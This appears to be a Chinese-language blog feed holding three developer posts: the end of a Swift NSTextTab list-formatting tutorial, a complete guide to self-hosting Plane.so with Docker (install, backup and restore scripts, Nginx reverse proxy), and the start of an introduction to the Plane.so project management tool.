項目符號完全可自訂 如果 location 有誤或無法符合，會出現直接的斷行上面的範例為了讓大家理解 NSTextTab 排版的方式，因此直接簡化了計算加總過程，把答案寫上去，如果要用在實際場景可參考以下完整程式碼：let attributedStringFont = UIFont.systemFont(ofSize: UIFont.systemFontSize)let iterator = ListItemIterator(font: attributedStringFont) //let listItem = ListItem(type: .decimal, text: \"\", subItems: [ ListItem(type: .circle, text: \"List Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 2\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 3\", subItems: [ ListItem(type: .circle, text: \"List Level 2 - 1\", subItems: []), ListItem(type: .circle, text: \"List Level 2 - 2 fafasffsafasfsafasas\\tfasfasfasfasfasfasfasfsafsaf\", subItems: []) ]), ListItem(type: .circle, text: \"List Level 1 - 4\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 5\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 6\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 7\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 8\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 9\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 10\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 11\", subItems: [])])let listItemIndent = ListItemIterator.ListItemIndent(preIndent: 8, sufIndent: 8)textView.attributedText = iterator.start(item: listItem, type: .decimal, indent: listItemIndent)//private extension UIFont { func widthOf(string: String) -&gt; CGFloat { return (string as NSString).size(withAttributes: [.font: self]).width }}private struct ListItemIterator { let font: UIFont struct ListItemIndent { let preIndent: CGFloat let sufIndent: CGFloat } func start(item: ListItem, type: NSTextList.MarkerFormat, indent: ListItemIndent) -&gt; NSAttributedString { let textList = NSTextList(markerFormat: type, startingItemNumber: 1) return item.subItems.enumerated().reduce(NSMutableAttributedString()) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: textList, parentIndent: indent.preIndent, sufIndent: indent.sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } } private func iterator(parentTextList: NSTextList, parentIndent: CGFloat, sufIndent: CGFloat, item: ListItem, itemNumber:Int) -&gt; NSAttributedString { let paragraphStyle = NSMutableParagraphStyle() // e.g. 1. var itemSymbol = parentTextList.marker(forItemNumber: itemNumber) switch parentTextList.markerFormat { case .decimal, .uppercaseAlpha, .uppercaseLatin, .uppercaseRoman, .uppercaseHexadecimal, .lowercaseAlpha, .lowercaseLatin, .lowercaseRoman, .lowercaseHexadecimal: itemSymbol += \".\" default: break } // width of \"1.\" let itemSymbolIndent: CGFloat = ceil(font.widthOf(string: itemSymbol)) let tabStops: [NSTextTab] = [ .init(textAlignment: .left, location: parentIndent), .init(textAlignment: .left, location: parentIndent + itemSymbolIndent + sufIndent) ] let thisIndent = parentIndent + itemSymbolIndent + sufIndent paragraphStyle.headIndent = thisIndent paragraphStyle.tabStops = tabStops paragraphStyle.defaultTabInterval = 28 let thisTextList = NSTextList(markerFormat: item.type, startingItemNumber: 1) // return item.subItems.enumerated().reduce(NSMutableAttributedString(string: \"\\t\\(itemSymbol)\\t\\(item.text)\\n\", attributes: [.paragraphStyle: paragraphStyle, .font: font])) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: thisTextList, parentIndent: thisIndent, sufIndent: sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } }}private struct ListItem { var type: NSTextList.MarkerFormat var text: String var subItems: [ListItem]} 我們宣告一個簡單的 ListItem 物件封裝子列表項目，透過遞迴組合、計算出項目列表間距與內容。 NSTextList 只使用 marker 方法產生列表符號，也可以不使用改成自行實現 要加寬項目符號前後寬度可直接透過設置 preIndent , sufIndent 達成。 因為需要計算位置，要使用 Font 來計算寬度，所以文字需要設定 .font 確保計算正確完成一開始奢望可以直接使用 NSTextList 就能達成，但效果跟客製化程度都很差；最後還是只能靠土炮 NSTextTab 用控制 \\t 位置的方式自行組合項目符號來達成，有點麻煩，不過效果可以完美符合需求！ 目的達成了，但依然沒有完全掌握 NSTextTab 的知識(例如: 不同方向？Location 的相對位置？)；官方文件、網路資料實在太少，有緣再來研究了。本文完整範例下載工商一個幫你把 HTML String 轉換成 NSAttributedString 的小工具，並且支援客製化樣式指定、客製化標籤功能。參考資料 ObjC String Rendering / ObjC 中國 — 字符串渲染 這篇文章有完整 NSAttributedString 的應用範例，其中也有介紹列表、表格功能的實現。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 281 Total Views Last Statistics Date: 2025-01-19 | 242 Views on Medium. " }, { "title": "Plane.so Docker Self-Hosted 自架紀錄", "url": "/posts/9903c9783a97/", "categories": "ZRealm Dev.", "tags": "ios-app-development, docker, nginx, project-management, self-hosted", "date": "2024-05-25 21:12:58 +0800", "snippet": "Plane.so Docker Self-Hosted 自架紀錄Plane Self-Hosted Docker 自架、備份、還原、Nginx Domain 反向代理設定教學前言Plane.so 是一套免費開源且支援 Self-Hosted 自架的類似 Asana, Jira, Clickup 專案管理工具，成立於 2022 年，第一版於 2023 年釋出，目前扔在開發階段。詳細使用操作與開...", "content": "Plane.so Docker Self-Hosted 自架紀錄Plane Self-Hosted Docker 自架、備份、還原、Nginx Domain 反向代理設定教學前言Plane.so 是一套免費開源且支援 Self-Hosted 自架的類似 Asana, Jira, Clickup 專案管理工具，成立於 2022 年，第一版於 2023 年釋出，目前扔在開發階段。詳細使用操作與開發流程結合介紹，請參考上篇文章「 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具 」本篇僅記錄 Plane.so 使用 Docker 自架的過程。Self-Hosted PlaneDocker Compose - Plane In this guide, we will walk you through the process of setting up a self-hosted environment. Self-hosting allows you to… docs.plane.so 支援 Docker, K8s / Cloud, 私人地端 安裝 Self-Hosted 為 Community Edition (官方簡稱 CE) 版 Self-Hosted 不一定會包含所有 Cloud 版功能 Self-Hosted 版功能預設比照的是 Cloud 免費版， 若要使用其他功能依然要升級付費版 。 本文為 Docker + 私人地端安裝為例 目前官方不提供從 Cloud 匯出，匯入到 Self-Hosted 版本，只能自己透過 API 串接實現 官方提示：超過 50 位使用者需提升機器性能We have seen performance degradation beyond 50 users on our recommended 4 GB, 2vCPU infra. Increased infra will help with more users. 使用 AGPL-3.0 license 開源，第一版 2023/01 推出，目前扔持續在開發階段，尚未提供正式 Relase 版。 請注意開源, 支援 Self-Hosted 不等於免費。 文末有附上完整設定範例 Repo。Docker 安裝本文不多做介紹，請參考 官方 Docker 安裝方式 ，完成本地 Docker 環境安裝、設定，以下以 macOS Docker 為例。Plane @ Docker 安裝參考 官方手冊 。 建立目錄＆下載安裝 Scriptmkdir plane-selfhostcd plane-selfhostcurl -fsSL -o setup.sh https://raw.githubusercontent.com/makeplane/plane/master/deploy/selfhost/install.shchmod +x setup.sh2. 確保 Docker 環境安裝好＆ Docker 啟動中，執行 Script./setup.sh 輸入 1 進行安裝(下載 Images) 等待 Plane 使用到的 Images Pulled 完成 Images Pulled 完成後，進入 ./plane-app 資料夾打開 .env 設定檔案APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=80WEB_URL=http://localhostDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://localhost#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 預設使用 :80 Port 啟動 Plane 服務，如果有衝突可以修 Port 完成設置調整 (不建議直接更改 docker-compose.yml 因為日後 Plane 更新會直接覆蓋掉此檔案)Plane @ Docker 啟動 再次進入 ./setup.sh 輸入 2 啟動 Plane： 完成啟動，且確認都啟動成功後，打開網址 / god-mode/ 進行首次設定： 這邊設定的帳號密碼為最高管理權限(God/Admin Mode) 基於安全考量，密碼須包含特殊符號、超過 8 個字元、包含數字、大小寫英文，否則無法送出 此步驟未設定進入首頁登入會顯示 Instance not configured. Please contact your administrator.Plane God/Admin Mode 管理後台可以從 Plane 網址 /god-mode/ 進入，這邊可設定整個 Plane 服務的環境。General Settings：一般設定。Email： Email 通知 SMTP 設定懶得自己弄 SMTP Server 可以 直接使用 GMAIL SMTP 寄信： Host: smtp.gmail.com Port: 465 Sender email address: 信件顯示信箱 e.g. noreply@zhgchg.li Username: 你的 Gmail 帳號 Password: 你的 Gmail 密碼， 如果有兩階段驗證要使用應用程式密碼 。 如果設定完沒反應請檢查 Port, Email Security 對應設定 (TLS/STARTTLS: 使用端口 587、SSL: 使用端口 465) 另外有個發想，因為 Plane 暫時不支援 Slack 通知，因此其實也可以起一個 SMTP Server 殼將信件通知自己透過 Python 腳本轉換成 Slack 通知。AuthenticationPlane 服務登入使用驗證方式，如果要綁定只有 Google 組織內的信箱帳戶可使用，可以關閉「Password based login」只啟用「Google」登入功能，再從 Google 登入那邊產生僅限組織帳號內使用的登入 App 即可。Artificial IntelligenceAI 相關設定，目前功用不大，有埋 Key 就能在 Issue 上使用 AI 協助撰寫 Issue Description。Image in Plane同樣目前功用不大，有埋 Unsplash Key 就能在專案封面圖選擇時透過 Unsplash API 抓取圖片並套用。 ⚠️⚠️聲明⚠️⚠️ 以上是 2024–05–25 v0.20-Dev 版的使用介紹，官方仍如火如荼開發新功能與優化使用者體驗，請以最新版的設定為主。 God/Admin Mode 設定好之後就差不多能如同使用 Cloud 版一樣使用。 詳細使用操作與開發流程結合介紹，請參考上篇文章「 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具 」Plane @ Docker 升級如同前述，Plane 仍處於開發階段，約每兩到三週會釋出新版，更動內容可能也會蠻巨大的；建議詳細閱讀 Release Note 改動與需要調整的設定，確定沒問題後再進行升級。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 因 Plane 處在開發階段，不穩定，不能保證升級不會造成資料遺失，因此建議操作前務必備份，備份方式下方會說明。升級方式： 再次進入 ./setup.sh 輸入 5 升級 Plane (其實也就只是拉新的 Images 下來 &amp; Restart) Images Pulled 完成後可以 Restart 重啟服務 升級後 .env 可能有所更動，請參考 Release Note 進行調整Plane @ Docker 備份自 0.20-dev 開始 ./setup.sh 新增一個 Backup Data 指令，但 翻閱官方手冊 ，只提到如何把 Backup Data Restore 到他們的 One 收費服務上；因此這邊還是用我自己土炮備份上傳檔案、Redis、備份 Postgresql Docker Container 的方式。備份腳本./plane-backup.sh :#!/bin/bash# 備份 Plane 資料# Author: zhgchgli (https://zhgchg.li)##### 執行方式# ./plane-backup.sh [備份到目標資料夾路徑] [Plane 的 Docker 專案名稱] [Plane 備份檔案最大保留數量，超過刪除最舊的備份]# e.g. ./plane-backup.sh /backup/plane plane-app 14###### 設定# 備份到目標資料夾backup_dir=${1:-.}# Plane 的 Docker 專案名稱docker_project_name=${2:-\"plane-app\"}# Plane 備份檔案最大保留數量，超過刪除最舊的備份keep_count=${3:-7}####### 檢查目錄是否存在if [ ! -d \"$backup_dir\" ]; then echo \"備份失敗，目錄不存在：$backup_dir\" exit;fi# Remove oldestcount=$(find \"$backup_dir\" -mindepth 1 -type d | wc -l)while [ \"$count\" -ge $keep_count ]; do oldest_dir=$(find \"$backup_dir\" -mindepth 1 -maxdepth 1 -type d | while read dir; do # 使用 stat 命令獲取修改時間 if [[ \"$OSTYPE\" == \"darwin\"* ]]; then # macOS 系統 echo \"$(stat -f %m \"$dir\") $dir\" else # Linux 系統 echo \"$(stat -c %Y \"$dir\") $dir\" fi done | sort -n | head -n 1 | cut -d ' ' -f 2-) echo \"Remove oldest backup: $oldest_dir\" rm -rf \"$oldest_dir\" count=$(find \"$backup_dir\" -mindepth 1 -type d | wc -l)done## Backup newdate_dir=$(date \"+%Y_%m_%d_%H_%M_%S\")target_dir=\"$backup_dir/$date_dir\"mkdir -p \"$target_dir\"echo \"Backuping to: $target_dir\"# Plane's Postgresql .SQL dumpdocker exec -i $docker_project_name-plane-db-1 pg_dump --dbname=postgresql://plane:plane@plane-db/plane -c &gt; $target_dir/dump.sql# Plane's redisdocker run --rm -v $docker_project_name-redis-1:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_redis.tar /volume &gt; /dev/null 2&gt;&amp;1# Plane's uploaded filesdocker run --rm -v ${docker_project_name}_uploads:/volume -v $target_dir:/backup ubuntu tar cvf /backup/plane-app_uploads.tar /volume &gt; /dev/null 2&gt;&amp;1echo \"Backup up Success!\"第一次建立 Script 檔案記得先： chmod +x ./plane-backup.sh執行方式：./plane-backup.sh [備份到目標資料夾路徑] [Plane 的 Docker 專案名稱] [Plane 備份檔案最大保留數量，超過刪除最舊的備份] 備份到目標資料夾路徑: e.g /backup/plane/ or ./ Plane 的 Docker 專案名稱: Plane Docker Compose Project 名稱 Plane 備份檔案最大保留數量，超過刪除最舊的備份: 預設 7 份執行範例：./plane-backup.sh /backup/plane plane-app 14 執行時要確保 Plane 是啟動中的狀態。只要將以上指令加入 Crontab 就能定時自動備份 Plane。 如果遇到執行錯誤，找不到 Container 請確認 Plane Docker Compose Project 名稱 或檢查腳本與 Docker 的容器名稱 (可能官方改名了)。還原腳本./plane-restore.sh :#!/bin/bash# 恢復 Plane 備份資料# Author: zhgchgli (https://zhgchg.li)##### 執行方式# ./plane-restore.sh# inputBackupDir() { read -p \"欲恢復的 Plane 備份檔案資料夾 (e.g. /backup/plane/2024_05_25_19_14_12): \" backup_dir}inputBackupDirif [[ -z $backup_dir ]]; then echo \"請提供備份資料夾 (e.g. sh /backup/docker/plane/2024_04_09_17_46_39)\" exit;fiinputDockerProjectName() { read -p \"Plane 的 Docker 專案名稱 (留空使用預設 plane-app): \" input_docker_project_name}inputDockerProjectName docker_project_name=${input_docker_project_name:-\"plane-app\"}confirm() { read -p \"您確定要執行 Restore Plane.so 資料? [y/N] \" response # Check the response case \"$response\" in [yY][eE][sS]|[yY]) true ;; *) false ;; esac}if ! confirm; then echo \"Action cancelled.\" exitfi# 恢復echo \"Restoring...\"docker cp $backup_dir/dump.sql $docker_project_name-plane-db-1:/dump.sql &amp;&amp; docker exec -i $docker_project_name-plane-db-1 psql postgresql://plane:plane@plane-db/plane -f /dump.sql# 恢復 Redisdocker run --rm -v ${docker_project_name}-redis-1:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_redis.tar --strip-component=1 -C /volume# 恢復上傳的檔案docker run --rm -v ${docker_project_name}_uploads:/volume -v $backup_dir:/backup alpine tar xf /backup/plane-app_uploads.tar --strip-component=1 -C /volumeecho \"Restore Success!\"第一次建立 Script 檔案記得先： chmod +x ./plane-restore.sh執行方式： ./plane-restore.sh輸入：欲恢復的 Plane 備份檔案資料夾 (e.g. /backup/plane/2024_05_25_19_14_12)輸入：Plane 的 Docker 專案名稱 (留空使用預設 plane-app)輸入：您確定要執行 Restore Plane.so 資料? [y/N] y看到 Restore Success! 成功後，需要重啟 Plane 才會生效。使用 Plane ./setup.sh 輸入 4 Restart：回到網站上重新整理、登入 Workspace 檢查是否恢復成功：完成！ ⚠️建議備份、還原流程要定期測試，確保出意外時備份能派上用場。Plane @ Docker 升級如同前述，Plane 仍處於開發階段，約每兩到三週會釋出新版，更動內容可能也會蠻巨大的；建議詳細閱讀 Release Note 改動與需要調整的設定，確定沒問題後再進行升級。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 ⚠️升級前務必備份！⚠️ 升級完成務必檢查排成備份腳本是否依然正常。 因 Plane 處在開發階段，不穩定，不能保證升級不會造成資料遺失，因此建議操作前務必備份。升級方式： 再次進入 ./setup.sh 輸入 5 升級 Plane (其實也就只是拉新的 Images 下來 &amp; Restart) Images Pulled 完成後可以 Restart 重啟服務 升級後 .env 可能有所更動，請參考 Release Note 進行調整 升級完成務必檢查排成備份腳本是否依然正常 如果 Container Name 有變動需更改備份、還原、下方介紹的 Nginx 反向代理腳本使用 Nginx + Plane 進行 Reverse Proxy 反向代理因為我們同時可能會有需多 Web 服務需要提供，例如： Self-Hosted LibreChat (ChatGPT) 、 Self-Hosted Wiki.js 、 Self-Hosted Bitwarden … 每個服務預設都需要 80 Port，如果我們不想在使用時在網址指定 Port，則可需要啟動一個 Docker Nginx 當作 Web 服務的反向代理。效果如下:chat.zhgchg.li -&gt; LibreChat :8082wiki.zhgchg.li -&gt; Wiki.js :8083pwd.zhgchg.li -&gt; Bitwarden :8084plane.zhgchg.li -&gt; Plane.so :8081要達成以上效果需要先把 ./plane-selfhost 目錄移動到一個統一目錄下，這邊取名 webServices 。最終目錄結構預覽：調整 webServices/plane-selfhost/plane-app/.env 環境設定檔案：APP_RELEASE=stableWEB_REPLICAS=1SPACE_REPLICAS=1ADMIN_REPLICAS=1API_REPLICAS=1NGINX_PORT=8081WEB_URL=http://plane.zhgchg.liDEBUG=0SENTRY_DSN=SENTRY_ENVIRONMENT=productionCORS_ALLOWED_ORIGINS=http://plane.zhgchg.li#DB SETTINGSPGHOST=plane-dbPGDATABASE=planePOSTGRES_USER=planePOSTGRES_PASSWORD=planePOSTGRES_DB=planePOSTGRES_PORT=5432PGDATA=/var/lib/postgresql/dataDATABASE_URL=# REDIS SETTINGSREDIS_HOST=plane-redisREDIS_PORT=6379REDIS_URL=# Secret KeySECRET_KEY=60gp0byfz2dvffa45cxl20p1scy9xbpf6d8c5y0geejgkyp1b5# DATA STORE SETTINGSUSE_MINIO=1AWS_REGION=AWS_ACCESS_KEY_ID=access-keyAWS_SECRET_ACCESS_KEY=secret-keyAWS_S3_ENDPOINT_URL=http://plane-minio:9000AWS_S3_BUCKET_NAME=uploadsMINIO_ROOT_USER=access-keyMINIO_ROOT_PASSWORD=secret-keyBUCKET_NAME=uploadsFILE_SIZE_LIMIT=5242880# Gunicorn WorkersGUNICORN_WORKERS=1# UNCOMMENT `DOCKER_PLATFORM` IF YOU ARE ON `ARM64` AND DOCKER IMAGE IS NOT AVAILABLE FOR RESPECTIVE `APP_RELEASE`# DOCKER_PLATFORM=linux/amd64 將網址替換為我們想要的網址，以 plane.zhgchg.li 為例 NGINX_PORT 換成 8081 把原本的 80 讓改反向代理 NginxwebServices/ 下建立一個 docker-compose.yml 檔案用來放 Nginx：version: '3.8'services: webServices-nginx: image: nginx restart: unless-stopped volumes: - ./nginx/conf.d/plane.zhgchg.li.conf:/etc/nginx/conf.d/plane.zhgchg.li.conf ports: - 80:80 - 443:443 networks: - plane-app_default #plane 所使用的網路networks: plane-app_default: external: true 我們需要把 Plane app 的網路加入到 NginxwebServices/ 下建立 /conf.d 目錄＆ plane.zhgchg.li.conf 檔案：# For plane.zhgchg.li# http example:server { listen 80; server_name plane.zhgchg.li; client_max_body_size 0; location / { proxy_pass http://plane-app-proxy-1; # plane proxy-1 服務名稱 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }}# https &amp; http example:# server {# listen 443 ssl;# server_name plane.zhgchg.li;# #ssl# ssl_certificate /etc/nginx/conf/ssl/zhgchgli.crt; # 替換成你域名的 crt &amp; 記得把 key 加到 docker-compose.yml volumes Mount 進 Docker# ssl_certificate_key /etc/nginx/conf/ssl/zhgchgli.key; # 替換成你域名的 key &amp; 記得把 key 加到 docker-compose.yml volumes Mount 進 Docker# ssl_prefer_server_ciphers on;# ssl_protocols TLSv1.1 TLSv1.2;# ssl_ciphers \"EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384 EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4 EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !RC4\";# ssl_ecdh_curve secp384r1; # Requires nginx &gt;= 1.1.0# ssl_session_timeout 10m;# ssl_session_cache shared:SSL:10m;# add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";# client_max_body_size 0;# location / {# proxy_pass http://plane-app-proxy-1; # plane proxy-1 服務名稱# proxy_set_header Host $host;# proxy_set_header X-Real-IP $remote_addr;# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;# proxy_set_header X-Forwarded-Proto $scheme;# }# }# server {# listen 80;# server_name plane.zhgchg.li;# return 301 https://plane.zhgchg.li$request_uri;# } proxy_pass 輸入 Plane 網路中的 服務入口 這邊只以 HTTP 當範例，若要支援 HTTPS 可參考 自行簽名憑證 的方式。因為有多個 docker-compose.yml 需要個別啟動，再啟動 Nginx 反向代理，因此我們可以把所有啟動腳本都放到同一個 Shell Script。webServices/ 下建立 /start.sh 檔案：#!/bin/sh# 封裝啟動 Script# 先啟動 Plane..等其他服務docker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env up -d# 最後才啟動 Nginxdocker compose -f ./docker-compose.yml --env-file ./.env up -d第一次建立 Script 檔案記得先： chmod +x ./start.sh停止服務也可以建立一個， webServices/ 下建立 /stop.sh 檔案：#!/bin/sh# 封裝停止 Scriptdocker compose -f ./plane-selfhost/plane-app/docker-compose.yaml --env-file ./plane-selfhost/plane-app/.env downdocker compose -f ./docker-compose.yml --env-file ./.env down第一次建立 Script 檔案記得先： chmod +x ./stop.sh啟動 我們封裝好 Nginx 反向代理＋Plane 服務＋其他…之後就可以直接下 ./start.sh 啟動所有服務./start.shDNS 設定架設在內網地端，需要請 IT 部門在內網 DNS 加上 plane.zhgchg.li -&gt; 伺服器 IP 位址的 DNS 紀錄。plane.zhgchg.li 伺服器 IP 位址如果你是在自己的電腦本地測試，可以在 /private/etc/hosts 檔案中加入：127.0.0.1 plane.zhgchg.liDNS 設定完成後 進入 plane.zhgchg.li 就能開啟 Plane 囉！常見問題 Nginx 啟動失敗，一直 Restarting，進入看 Log 顯示 nginx: [emerg] host not found in upstream代表 Nginx 反向代理服務找不到 Plane 服務，要檢查 http://plane-app-proxy-1 名稱是否正確、Nginx docker-compose.yml 網路設定是否正確 出現 502 Bad Gateway啟動順序有誤(確保 Nginx 反向代理是最後啟動)或 Plane 進程有重啟過，嘗試重新啟動應該就可以了。 出現 Nginx 默認首頁 welcome to nginx! ，使用反向代理你將不再能使用原本 IP:80 方式進入 Plane，要使用網址 網址無法解析、找不到主機，請確認 DNS 網路設定是否正常。⚠️⚠️資安問題⚠️⚠️因 Plane 專案正在開發中並且是開源專案，尚不確定有無嚴重系統漏洞，最嚴重可能會變成入侵入口；因此不建議將 Plane.so Self-Hosted 建立在公開網路上，可多加一層安全驗證(Tunnel or 憑證 or VPN)通過才能連入；架設在內網也最好隔離開來。開發中專案難免有 Bug、體驗、安全問題，請大家多給 Plane.so 團隊一點耐心；有任何問題也歡迎到下方回報： 問題回報： https://github.com/makeplane/plane/issues 官方 Discord： https://discord.com/invite/A92xrEGCge完整 Self-Hosted Repo 範例下載Plane.so 使用與 Scurm 流程結合教學 Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 540 Total Views Last Statistics Date: 2025-01-19 | 525 Views on Medium. " }, { "title": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具", "url": "/posts/9d0f23784359/", "categories": "ZRealm Dev.", "tags": "ios-app-development, asana, scrum, project-management, open-source", "date": "2024-05-25 16:28:02 +0800", "snippet": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具Plane.so 專案管理工具使用介紹與搭配 Scurm 流程的使用背景Asana在前司 Pinkoi 時第一次體會到 Asana 專案管理工具的強大，不管是內部專案管理或是跨團隊之間的協作，Asana 都能在其中擔任解耦人與人、人與事之間依賴的角色，提升協作效率。在前司從產品團隊到經營、商業團...", "content": "Plane.so 免費開源且支援 Self-Hosted 的類 Asana/Jira 專案管理工具Plane.so 專案管理工具使用介紹與搭配 Scurm 流程的使用背景Asana在前司 Pinkoi 時第一次體會到 Asana 專案管理工具的強大，不管是內部專案管理或是跨團隊之間的協作，Asana 都能在其中擔任解耦人與人、人與事之間依賴的角色，提升協作效率。在前司從產品團隊到經營、商業團隊 (如：HRBP, Finance, Marketing, BD…) 所有團隊都會有一個團隊公開的 Project 作為跨團隊間的單一協作入口，當其他團隊需要協助時，可以直接開一張 Task (也可以從 Template Task) 到該 Project (通常都會有一個 Need Help! Section)，團隊內部收到 Task 後會接手進行安排。與經營團隊的跨團隊協作，如採購、招募流程，可以直接開 Task 並透過他追蹤進度；與商業團隊的協作如行銷活動規劃、需要工程協助修改的任務…等等。如果沒有 Asana 或類似的專案管理工具： 任何事物我們都需要與對方團隊進行直接溝通，P0 事務直接溝通是最有效的，但日常上應該有 90% 都不會是 P0 事務，不管大小事都直接人對人溝通很沒有效率且會 打斷對方工作心流 任務執行不透明，只有對談雙方知道狀況進度，如果是多方任務就只能靠溝通反覆確認進度；另外，主管也難掌握大家手上任務進行合理安排 任務的安排，日常上我們會收到很多 Task，優先度有高有低、方向也很多面，有工具在才能搜集、歸類同類型的問題，日後一起挑出來解決；日常工作安排也較容易挑出重要的任務 任務的交接，有工具紀錄任務細節、執行狀況，若遇到需要其他人協助時，可以快速從 Task 上的內容接手任務回到專案管理上，Asana 提供彈性、多維度、自動化的專案管理工具，可以依照需求自行組合使用。 Asana 的使用方式有很多，以下僅舉幾個使用案例，建議先確定需求再找相關 Asana 範例套用使用。 Asana 台灣代理商亦有提供完整的教育訓練，有興趣可以與他們聯絡。 (本篇無業配)範例1團隊專案 Project To Do: 這週、下週將要開始的任務 In Progress: 正在執行的項目 Review: 已完成，等待 Sprint Review Backlog: 任務池子，每週從中挑出 Task 安排執行團隊 Scrum Project除了團隊主 Project 外會再開一個 Scrum Project 安排(Asana Task 可同時加入多個 Project)、回顧每個 Sprint 任務執行內容。範例2範例二是使用 Section 作為 Sprint 區分，每週會建立一個 Section 將任務拖入，另外透過 Label 標記其他狀態。回到現實如同前述，以上是前司 Pinkoi 有 Asana 專案管理工具的場景；這幾個月回到沒有專案管理工具的環境，可以說是更感覺到工具對工作效率的重要性。目前環境沒有較現代的專案管理工具，基於採購(需控制支出)、內控問題(純內網)與個資稽核限制(必須地端)，因此無法直接導入使用 Asana。基於以上環境限制，只能先朝開源且支援 Self-Hosted 的專案管理工具著手，找到的解決方案不外乎就是：Redmine, OpenProject, Taiga…嘗試了幾套效果都不如預期，功能缺少、UI/UX 不友善；直到無意間找到一套 2023/01 才新推出的 Plane.so 專案管理工具。順便推薦一下這個網站，收錄很多可以支援 Self-Hosted 的服務：awesome-selfhosted A list of Free Software network services and web applications which can be hosted on your own servers awesome-selfhosted.net 說這麼多，以下正文開始。目錄本文分為： Plane.so 介紹 Plane.so 操作教學 Plane.so x Scrum 工作流程範例 附錄可依照需求查看，Docker Self-Hosted 自架教學請參考下篇「 Plane.so Docker Self-Hosted 自架紀錄 」。Plan.so 介紹簡介Plane 成立於 2022 年，是來自 美國德拉瓦州 和 印度 的新創公司，目前觀察 Linkedin 與 Github 活動大部分的開發人員都在印度；該公司目前已募集到 400 萬美元的啟動天使資金 (由 OSS Capital 投資)。目前 Plane 佔據 Github 專案管理類別第一名 ，使用 AGPL-3.0 license 開源，第一版 2023/01 推出，目前扔持續在開發階段，尚未提供正式 Relase 版。 請注意： ⚠️ 開源 不等於 免費 ⚠️ ， 如同 Github 與 Gitlab，專案管理工具有很多類似 Github 的產品，例如 Asana, Jira, Clickup 但是還沒有一套足夠好用足以匹敵的 Gitlab 開源產品，而 Plane 的目標就是成為專案管理工具類的 Gitlab。 約保持兩到三週更新一次開發版本，部分調整可能差距較大或仍有資安問題。 暫時不支援多語系(中文) 支援 Self-Hosted 目前官方不提供從 Cloud 匯出，匯入到 Self-Hosted，只能自己透過 API 串接實現，因此若有考慮 Self-Hosted 地端使用，建議只把 Cloud 當成試用版使用 macOS App, iOS App, Android App 也正如火如荼開發中。Plane Product Roadmap 可參考 官網資訊 ：https://sites.plane.so/plane/459cfcdf-dc9c-49a6-9d4b-a89f91440189/?board=kanban開源 Repo：方案Plane 提供雲端版本服務，$0 美金起，Pro 提供更多框架與整合、自動化功能。另外官方正在推廣 $799 早期終身方案，有興趣付費支持的團隊可以直接參考此方 案：Community Edition (官方簡稱 CE 版)， Self-Hosted 版本，同樣是 $0 美金起， 如果要使用進階功能依然要購買 Pro 但可以支援 Self-Hosted 。框架Plane.so 不同於 Asana 